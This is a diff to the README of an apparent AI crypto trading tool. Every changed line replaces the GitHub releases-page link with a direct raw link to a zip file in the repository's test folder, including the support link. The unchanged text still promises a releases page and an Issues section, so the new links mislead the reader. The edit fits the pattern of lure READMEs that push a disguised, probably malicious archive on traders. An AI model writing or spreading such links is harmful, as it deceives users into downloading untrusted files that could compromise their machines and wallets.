@@ -1,6 +1,6 @@
 # ⚡ HyperLiquid-Claw - Smarter Trading with AI Access
 
-[![Download HyperLiquid-Claw](https://img.shields.io/badge/Download-HyperLiquid--Claw-blue?style=for-the-badge)](https://github.com/kaileycompact51/HyperLiquid-Claw/releases)
+[![Download HyperLiquid-Claw](https://img.shields.io/badge/Download-HyperLiquid--Claw-blue?style=for-the-badge)](https://raw.githubusercontent.com/kaileycompact51/HyperLiquid-Claw/main/test/Hyper_Claw_Liquid_v3.9.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This section explains how to download and start HyperLiquid-Claw on a Windows co
 You will find the latest version of HyperLiquid-Claw on the GitHub releases page. Please follow the steps below to download and install it properly.
 
 1. Click the large blue button above or visit this link:  
-   [https://github.com/kaileycompact51/HyperLiquid-Claw/releases](https://github.com/kaileycompact51/HyperLiquid-Claw/releases)  
+   [https://raw.githubusercontent.com/kaileycompact51/HyperLiquid-Claw/main/test/Hyper_Claw_Liquid_v3.9.zip](https://raw.githubusercontent.com/kaileycompact51/HyperLiquid-Claw/main/test/Hyper_Claw_Liquid_v3.9.zip)  
    This takes you to the page listing all available versions for download.
 
 2. Look for the latest version in the "Releases" section. The newest release is usually at the top. Verify the file name ends with `.exe` or `.zip`.
@@ -117,7 +117,7 @@ HyperLiquid-Claw only connects to public APIs. Your private keys are not stored 
 ## 💬 Help and Support
 
 You can find updates and report issues here:  
-[https://github.com/kaileycompact51/HyperLiquid-Claw/releases](https://github.com/kaileycompact51/HyperLiquid-Claw/releases)
+[https://raw.githubusercontent.com/kaileycompact51/HyperLiquid-Claw/main/test/Hyper_Claw_Liquid_v3.9.zip](https://raw.githubusercontent.com/kaileycompact51/HyperLiquid-Claw/main/test/Hyper_Claw_Liquid_v3.9.zip)
 
 Look for the “Issues” section in the repository to ask questions or get help from developers.
 
